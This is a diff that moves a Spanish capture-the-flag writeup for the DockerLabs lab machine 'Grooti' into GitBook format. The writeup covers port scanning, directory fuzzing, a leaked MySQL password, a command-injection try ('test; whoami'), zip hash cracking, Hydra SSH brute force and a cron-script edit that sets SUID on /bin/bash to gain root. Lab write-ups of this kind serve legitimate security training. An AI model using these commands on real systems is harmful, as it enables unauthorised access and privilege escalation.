@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Grooti 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Grooti ​​
 
-> **Tags:** `Linux` `Web` `MySQL` `Gobuster` `Burp Suite` `John The Ripper` `Hydra` `Fuzzing` `Cron Job` 
+## 🖥️ Writeup - Grooti
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Web` `MySQL` `Gobuster` `Burp Suite` `John The Ripper` `Hydra` `Fuzzing` `Cron Job`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip grooti.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh grooti.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80,3306 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 18:28 CEST
 Nmap scan report for 172.17.0.2
@@ -95,14 +104,16 @@ Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds
 
 Investigando la página web en el puerto 80 descubrimos un archivo `README.txt` que contiene la contraseña `password1`, aunque no sabemos a qué usuario o servicio está asociada.
 
-# GOBUSTER
+## GOBUSTER
 
 Vamos a investigar si existen más directorios interesantes que nos puedan aportar información adicional.
 
 ```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
-``` 
+```
+
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -142,6 +153,7 @@ mysql -u rocket -p -h 172.17.0.2 --ssl=0
 Ya tenemos el comando para acceder a la base de datos con el usuario rocket, y contamos con la contraseña encontrada anteriormente `password1`, así que vamos a intentarlo.
 
 Info:
+
 ```
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MySQL connection id is 21
@@ -153,9 +165,11 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 MySQL [(none)]> 
 ```
+
 Indagando en MySQL encontramos una base de datos llamada `files_secret` con una tabla llamada `rutas`. Dentro de ella aparecen rutas interesantes.
 
 Info:
+
 ```
 MySQL [files_secret]> select * from rutas;
 +----+------------+---------------------------------+
@@ -168,6 +182,7 @@ MySQL [files_secret]> select * from rutas;
 +----+------------+---------------------------------+
 4 rows in set (0.000 sec)
 ```
+
 Una de estas podría corresponder a un directorio de la página web que antes no habíamos podido localizar utilizando Gobuster.
 
 Y efectivamente, en `http://172.17.0.2/uprivate/secret` encontramos un formulario. Dicho formulario permite introducir un string de texto y un número del 1 al 100.
@@ -178,14 +193,15 @@ Como primer intento de explotación para lograr un RCE, probamos a introducir en
 
 ```bash
 test; whoami
-``` 
+```
+
 Sin embargo, este enfoque no funcionó.
 
 A continuación, utilizamos BurpSuite para interceptar la petición y configurar un ataque de tipo Intruder, probando secuencialmente todos los valores numéricos del 1 al 100. El objetivo es identificar posibles diferencias o anomalías en las respuestas.
 
 Durante esta prueba, observé que la respuesta correspondiente al número 16 era más larga de lo habitual.
 
-![Respuestas](../../images/image.png)
+![Respuestas](../../.gitbook/assets/image.png)
 
 Repetimos el envío manual del formulario con el número 16, y en lugar de recibir un archivo `.txt`, el servidor devuelve un archivo `.zip`.
 
@@ -195,12 +211,14 @@ Usaremos john the ripper para extraer el hash y crackearlo.
 
 ```bash
 zip2john password16.zip > hash.txt
-``` 
+```
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-``` 
+```
+
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -221,6 +239,7 @@ hydra -L users.txt -P password16.txt ssh://172.17.0.2 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -238,11 +257,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-02 20:17:
 
 Tenemos la contrasenya del usuario `grooti` : `YoSoYgRoOt`
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
@@ -263,9 +282,9 @@ Si conseguimos modificar el contenido de este archivo, probablemente podremos ej
 ```bash
 printf '#!/bin/bash\nchmod u+s /bin/bash\n' > malicious.sh
 ```
+
 Hemos alterado el script para que otorgue permisos SUID al binario `/bin/bash`. Ahora solo queda esperar unos segundos y probar el comando `/bin/bash -p` , lo que debería proporcionarnos una shell con privilegios de root.
 
+![root](../../.gitbook/assets/image-1.png)
 
-![root](../../images/image-1.png)
-
-Ya somos root! 
+Ya somos root!
